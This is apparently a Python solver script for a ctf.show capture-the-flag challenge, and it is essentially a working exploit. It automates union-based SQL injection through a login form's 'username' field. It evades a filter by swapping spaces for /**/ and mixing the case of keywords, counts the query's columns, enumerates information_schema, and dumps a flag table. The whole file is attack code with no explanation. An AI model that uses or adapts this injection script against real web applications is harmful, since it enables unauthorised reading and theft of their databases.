import os
import time
from pathlib import Path
import re

from requests_html import AsyncHTMLSession, HTMLSession

url = 'http://5289fd90-099b-4e54-8fb9-ad8f6a6972f1.challenge.ctf.show:8080/'
# flag_success = '欢迎'
failed_text = 'error'

fuzz_column_num = "1' union select {}#"
# payload1_database_length = '-1\' or length(database())={}#'
payload_database = "-1' UNion {} #"
payload_table    = "-1' UNion {} from information_schema.tables where table_schema=database()#"
payload_column   = "-1' UNion {} from information_schema.columns where table_name='{}'#"
payload_data     = "-1' UNion {} from {}#"

key = "username"
fuzz = {
    ' ': '/**/'
}

start_time = time.time()
session = HTMLSession()
# session.proxies = {'http': 'http://localhost:8080'}


def get_cnum(payload):
    file = Path('sql_column_num')
    if file.exists() and time.time() - file.stat().st_ctime > 3600:   # 超过1小时删除
        file.unlink()
    if file.exists():
        return file.read_text()

    res = session.post(url, data={key: payload.format('0')})

    i = 0
    while '5555' not in res.text:
        l = range(i + 1)
        txt = [f'5555{j}' for j in l]
        res = session.post(url, data={
            key: payload.format(','.join(txt)),
            'password': '123'
        })
        i += 1


    pos = re.search('5555.',res.text).group()[-1]
    pos = int(pos)
    fill = ','.join(str(x) if x !=pos else '{}' for x in range(i))

    select = f'SELEct {fill}'
    open('sql_column_num', 'w').write(select)
    return select


def go(title, payload):
    if fz := globals().get('fuzz', ''):
        for k, v in fz.items():
            payload = payload.replace(k, v)
    if title == 'column_num':
        return get_cnum(payload)

    res = session.post(url, data={
        key: payload,
        'password': ''
    })
    print(title, ' = ', res.text)


def init(select):
    global payload_database
    global payload_table
    global payload_column
    global payload_data
    payload_database = payload_database.format(select).format('database()')
    payload_table = payload_table.format(select).format("group_concat(table_name)")
    payload_column = payload_column.format(select, '{}').format('group_concat(column_name)', '{}')
    payload_data = payload_data.format(select, '{}')



    return


if __name__ == '__main__':
    table_name = 'flag'
    column_name = 'flag'

    select = go('column_num', fuzz_column_num)
    init(select)
    # go('database', payload_database)  # 'kanwolongxia'
    # go('table', payload_table)  # 'loflag'
    # go('column', payload_column.format(table_name))  # Id,flaglo
    go('data', payload_data.format(column_name, table_name))
    print("--- %s seconds ---" % (time.time() - start_time))
